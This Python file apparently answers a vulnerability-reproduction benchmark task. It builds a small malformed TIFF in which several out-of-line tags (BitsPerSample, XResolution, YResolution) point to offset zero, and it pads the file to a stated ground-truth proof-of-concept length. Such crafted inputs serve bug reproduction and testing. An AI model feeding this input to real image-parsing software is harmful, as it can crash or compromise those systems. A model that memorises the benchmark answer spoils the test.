import struct
from typing import Optional
import os
import tarfile
import tempfile
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a minimal TIFF file with an invalid off-IFD tag (value offset = 0)
        # Intentionally crafted to exercise handling of "offline" tags with zero offset.
        # Little-endian TIFF ("II"), magic 42, first IFD at offset 8.
        header = b'II' + struct.pack('<H', 42) + struct.pack('<I', 8)

        # Define helper to build IFD entries
        def ifd_entry(tag: int, typ: int, count: int, value_or_offset: int) -> bytes:
            return struct.pack('<HHII', tag, typ, count, value_or_offset)

        # Build a set of tags in ascending order
        entries = []
        # 256 ImageWidth: LONG, 1, value 1
        entries.append(ifd_entry(0x0100, 4, 1, 1))
        # 257 ImageLength: LONG, 1, value 1
        entries.append(ifd_entry(0x0101, 4, 1, 1))
        # 258 BitsPerSample: SHORT, 3, offset 0 (invalid offline tag: requires 6 bytes off-IFD)
        entries.append(ifd_entry(0x0102, 3, 3, 0))
        # 259 Compression: SHORT, 1, value 1 (no compression)
        entries.append(ifd_entry(0x0103, 3, 1, 1))
        # 262 PhotometricInterpretation: SHORT, 1, value 2 (RGB)
        entries.append(ifd_entry(0x0106, 3, 1, 2))
        # 273 StripOffsets: LONG, 1, value 0 (will point to start; combined with invalid tags)
        entries.append(ifd_entry(0x0111, 4, 1, 0))
        # 277 SamplesPerPixel: SHORT, 1, value 3
        entries.append(ifd_entry(0x0115, 3, 1, 3))
        # 278 RowsPerStrip: LONG, 1, value 1
        entries.append(ifd_entry(0x0116, 4, 1, 1))
        # 279 StripByteCounts: LONG, 1, value 1
        entries.append(ifd_entry(0x0117, 4, 1, 1))
        # 282 XResolution: RATIONAL, 1, offset 0 (invalid offline tag)
        entries.append(ifd_entry(0x011A, 5, 1, 0))
        # 283 YResolution: RATIONAL, 1, offset 0 (invalid offline tag)
        entries.append(ifd_entry(0x011B, 5, 1, 0))
        # 284 PlanarConfiguration: SHORT, 1, value 1
        entries.append(ifd_entry(0x011C, 3, 1, 1))

        num_entries = len(entries)
        ifd_data = struct.pack('<H', num_entries) + b''.join(entries) + struct.pack('<I', 0)

        data = header + ifd_data

        # Pad to 162 bytes (ground-truth PoC length), though exact length is not required
        target_len = 162
        if len(data) < target_len:
            data += b'\x00' * (target_len - len(data))

        return data